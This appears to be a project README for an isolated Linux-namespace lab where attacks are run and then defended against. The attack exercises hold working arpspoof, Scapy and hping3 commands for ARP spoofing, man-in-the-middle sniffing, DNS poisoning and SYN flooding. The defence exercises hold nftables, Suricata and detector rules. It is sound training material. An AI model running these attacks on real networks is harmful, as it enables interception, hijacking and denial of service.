# NETLAB — Network Attack & Defense Lab

> An isolated network lab built entirely with Linux namespaces. Create virtual networks, deploy services, execute real attacks, then build and test defenses. Every exercise produces a PCAP and a writeup.

---

## Repo Structure

```
netlab/
├── README.md
├── NOTES.md                        ← learning notes as you build
│
├── lab/
│   ├── setup.sh                    ← creates the full namespace topology
│   ├── teardown.sh                 ← destroys everything cleanly
│   ├── status.sh                   ← shows current lab state (namespaces, IPs, bridges)
│   └── services/
│       ├── http-server.py          ← simple HTTP server for target namespace
│       ├── dns-server.conf         ← dnsmasq config for DNS namespace
│       └── ftp-server.py           ← simple FTP service (optional)
│
├── attacks/
│   ├── 01-arp-spoof/
│   │   ├── attack.sh               ← arpspoof command wrapper
│   │   ├── attack.py               ← scapy version (manual crafting)
│   │   └── README.md               ← what this attack does, how it works
│   ├── 02-mitm/
│   │   ├── intercept.py            ← packet interception + modification with scapy
│   │   └── README.md
│   ├── 03-dns-poison/
│   │   ├── poison.py               ← DNS response spoofing with scapy
│   │   └── README.md
│   └── 04-syn-flood/
│       ├── flood.sh                ← hping3 SYN flood
│       ├── flood.py                ← scapy version
│       └── README.md
│
├── defenses/
│   ├── 01-arp-defense/
│   │   ├── static-arp.sh           ← set static ARP entries
│   │   ├── detect.py               ← ARP anomaly detector (or use sentinel)
│   │   └── README.md
│   ├── 02-firewall/
│   │   ├── firewall.nft            ← nftables ruleset (anti-spoof, rate limiting)
│   │   ├── apply.sh                ← applies nftables rules to namespace
│   │   └── README.md
│   ├── 03-ids/
│   │   ├── suricata-custom.rules   ← custom Suricata signatures for lab attacks
│   │   ├── sentinel-rules.yaml     ← sentinel rules tuned for lab traffic
│   │   └── README.md
│   └── 04-hardening/
│       ├── sysctl.sh               ← kernel params (rp_filter, arp_ignore, etc.)
│       └── README.md
│
├── captures/
│   └── .gitkeep                    ← PCAPs saved here per exercise
│
└── writeups/
    ├── 01-arp-spoof.md             ← full attack + defense documented with evidence
    ├── 02-mitm.md
    ├── 03-dns-poison.md
    └── 04-syn-flood.md
```

---

## File-by-File Breakdown

### lab/setup.sh — Creates the Lab

What it does:
- Creates 4 network namespaces: ns-atk (attacker), ns-def (defender), ns-srv (target), ns-dns (DNS)
- Creates a Linux bridge (br-lab) to connect them
- Creates veth pairs linking each namespace to the bridge
- Assigns IP addresses to each namespace
- Enables IP forwarding where needed
- Starts services (HTTP on target, DNS on dns-server)

Key commands you'll use:
```bash
# create a namespace
ip netns add ns-atk

# create a veth pair (two virtual ethernet ends)
ip link add veth-atk type veth peer name veth-atk-br

# move one end into the namespace
ip link set veth-atk netns ns-atk

# assign IP inside the namespace
ip netns exec ns-atk ip addr add 10.0.0.2/24 dev veth-atk
ip netns exec ns-atk ip link set veth-atk up

# attach the other end to the bridge
ip link set veth-atk-br master br-lab
ip link set veth-atk-br up
```

IP assignments:
```
ns-atk  (attacker)     → 10.0.0.2
ns-def  (defender)      → 10.0.0.3
ns-srv  (target-server) → 10.0.0.10
ns-dns  (dns-server)    → 10.0.0.53
br-lab  (bridge)        → 10.0.0.1
```

### lab/teardown.sh — Destroys the Lab

What it does:
- Deletes all namespaces (which auto-removes veth pairs)
- Deletes the bridge
- Kills any running services

```bash
ip netns del ns-atk
ip netns del ns-def
ip netns del ns-srv
ip netns del ns-dns
ip link del br-lab
```

### lab/status.sh — Shows Lab State

What it does:
- Lists active namespaces
- Shows IP addresses in each namespace
- Shows bridge status and connected interfaces
- Shows running services

### lab/services/http-server.py — Target Web Server

What it does:
- Simple Python HTTP server running inside ns-srv
- Serves a basic page so you have real HTTP traffic to intercept
- Runs on port 80

```python
# launched as:
ip netns exec ns-srv python3 http-server.py
```

### lab/services/dns-server.conf — DNS Server Config

What it does:
- dnsmasq config for ns-dns
- Resolves lab domains: target.lab → 10.0.0.10
- DNS poisoning attack will try to override these responses

---

## Attack Exercises

### 01 — ARP Spoof

**Goal:** Trick the target into thinking attacker's MAC is the gateway's MAC.

**How it works:**
- ARP maps IP addresses to MAC addresses on a LAN
- Attacker sends fake ARP replies: "10.0.0.1 (gateway) is at AA:BB:CC:DD:EE:FF (attacker's MAC)"
- Target updates its ARP cache and starts sending traffic to attacker
- Attacker forwards traffic to real gateway (becomes invisible man-in-the-middle)

**Attack procedure:**
```bash
# from attacker namespace
ip netns exec ns-atk arpspoof -i veth-atk -t 10.0.0.10 10.0.0.1
```

**Scapy version (manual):**
```python
# Craft and send fake ARP reply
pkt = ARP(op=2, pdst="10.0.0.10", hwdst="target-mac", psrc="10.0.0.1")
send(pkt, loop=1, inter=2)
```

**What to capture:** tcpdump on the target showing ARP cache change

**Defense:** Static ARP entries, ARP inspection, sentinel arp_spoof detector

---

### 02 — Man-in-the-Middle

**Goal:** Intercept and optionally modify traffic between target and gateway.

**How it works:**
- First ARP spoof both target and gateway
- Enable IP forwarding on attacker so traffic still flows
- Sniff all traffic passing through attacker
- Optionally modify packets (inject content, change DNS responses)

**Attack procedure:**
```bash
# enable forwarding on attacker
ip netns exec ns-atk sysctl -w net.ipv4.ip_forward=1
# ARP spoof both directions
ip netns exec ns-atk arpspoof -i veth-atk -t 10.0.0.10 10.0.0.1 &
ip netns exec ns-atk arpspoof -i veth-atk -t 10.0.0.1 10.0.0.10 &
# sniff traffic
ip netns exec ns-atk tcpdump -i veth-atk -w captures/mitm.pcap
```

**What to capture:** HTTP requests from target visible on attacker's tcpdump

**Defense:** HTTPS (encrypted traffic can't be read), nftables anti-spoof rules

---

### 03 — DNS Poisoning

**Goal:** Make the target resolve target.lab to attacker's IP instead of real server.

**How it works:**
- Attacker sniffs DNS requests from target
- Sends a fake DNS response before the real DNS server replies
- Target caches the fake response and connects to attacker instead

**Scapy approach:**
```python
# Sniff DNS query, craft fake response
def poison(pkt):
    if pkt.haslayer(DNS) and pkt[DNS].qr == 0:  # query
        spoofed = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                  UDP(dport=pkt[UDP].sport, sport=53) / \
                  DNS(id=pkt[DNS].id, qr=1, aa=1,
                      qd=pkt[DNS].qd,
                      an=DNSRR(rrname=pkt[DNSQR].qname, rdata="10.0.0.2"))
        send(spoofed)

sniff(filter="udp port 53", prn=poison, iface="veth-atk")
```

**What to capture:** DNS response with spoofed IP, target connecting to attacker

**Defense:** DNSSEC, DNS over HTTPS, firewall rules blocking rogue DNS responses

---

### 04 — SYN Flood

**Goal:** Overwhelm the target server so it can't accept new connections.

**How it works:**
- Attacker sends thousands of SYN packets per second
- Target allocates resources for each half-open connection
- Target's connection table fills up, legitimate connections are dropped

**Attack procedure:**
```bash
ip netns exec ns-atk hping3 -S --flood -p 80 10.0.0.10
```

**What to capture:** Massive SYN packet count on target, connection timeouts

**Defense:** SYN cookies (kernel), nftables rate limiting, sentinel syn_flood detector

---

## Defense Tools

### nftables firewall (defenses/02-firewall/firewall.nft)

```nft
table inet filter {
    chain input {
        type filter hook input priority 0; policy drop;

        # allow established connections
        ct state established,related accept

        # allow loopback
        iif lo accept

        # rate limit new connections (anti SYN flood)
        tcp flags syn limit rate 25/second burst 50 accept

        # drop invalid
        ct state invalid drop

        # allow specific services
        tcp dport { 22, 80, 53 } accept
        udp dport 53 accept

        # log and drop everything else
        log prefix "nftables-drop: " drop
    }
}
```

### Suricata custom rules (defenses/03-ids/suricata-custom.rules)

```
# detect ARP spoofing (multiple ARP replies from same source)
alert arp any any -> any any (msg:"Possible ARP spoof - excessive replies"; \
    arp_opcode:2; threshold:type threshold, track by_src, count 10, seconds 5; \
    sid:1000001; rev:1;)

# detect SYN flood
alert tcp any any -> $HOME_NET any (msg:"SYN flood detected"; \
    flags:S; threshold:type threshold, track by_src, count 100, seconds 2; \
    sid:1000002; rev:1;)

# detect DNS queries to suspicious ports
alert udp any any -> any !53 (msg:"DNS on non-standard port"; \
    content:"|00 01 00 00|"; offset:4; depth:4; sid:1000003; rev:1;)
```

### sentinel integration (defenses/03-ids/sentinel-rules.yaml)

```yaml
rules:
  - name: "Lab ARP spoof"
    protocol: arp
    threshold:
      count: 5
      window: 10
      group_by: src_mac
    severity: high
    message: "ARP spoof detected from {src_mac}"

  - name: "Lab SYN flood"
    protocol: tcp
    flags: SYN
    dst_ip: "10.0.0.10"
    threshold:
      count: 50
      window: 5
      group_by: src_ip
    severity: critical
    message: "SYN flood targeting server from {src_ip}"
```

---

## Build Order (milestones)

1. **setup.sh** — create namespaces, bridge, veth pairs, assign IPs. Verify with ping between namespaces.
2. **services** — start HTTP server on ns-srv, DNS on ns-dns. Verify with curl from ns-atk.
3. **ARP spoof attack** — execute from ns-atk, verify target ARP cache changes.
4. **ARP defense** — static ARP entries, run sentinel in ns-def, verify detection.
5. **MITM attack** — ARP spoof + forwarding + sniffing. Capture HTTP traffic.
6. **Firewall defense** — apply nftables rules, verify MITM is blocked.
7. **DNS poisoning** — spoof DNS response with scapy. Verify target connects to wrong IP.
8. **SYN flood** — hping3 flood from ns-atk. Verify target becomes unresponsive.
9. **Rate limiting defense** — nftables rate limiting + SYN cookies. Verify flood is mitigated.
10. **Writeups** — document each exercise with PCAPs, screenshots, and lessons learned.

---

## How to Run

```bash
# create the lab
sudo ./lab/setup.sh

# check everything is up
sudo ./lab/status.sh

# run a command inside a namespace
sudo ip netns exec ns-atk bash

# capture traffic in a namespace
sudo ip netns exec ns-srv tcpdump -i veth-srv -w captures/arp-attack.pcap

# run sentinel inside defender namespace
sudo ip netns exec ns-def python3 ~/codex-workspace/sentinel/src/main.py -i veth-def

# destroy the lab
sudo ./lab/teardown.sh
```

---

## Key Concepts You'll Learn

- **Network namespaces** — isolated network stacks within a single Linux kernel
- **veth pairs** — virtual ethernet cables connecting namespaces
- **Linux bridges** — virtual switches connecting multiple veth endpoints
- **ARP protocol** — how MAC/IP mapping works and why it's exploitable
- **Man-in-the-middle** — intercepting traffic by being the relay point
- **DNS spoofing** — racing the real DNS server to inject fake responses
- **nftables** — Linux's modern firewall framework (successor to iptables)
- **Suricata** — production IDS/IPS, complement to your custom sentinel

## Connection to Other Projects

- **sentinel** → runs inside the lab as the defender's IDS, detects attacks in real time
- **mysh** → namespace commands run through bash, but you understand process isolation from building the shell
- **syswatch** → monitoring resource usage during flood attacks shows system impact
- **Wokwi (future)** → IoT device traffic routed through the lab for analysis
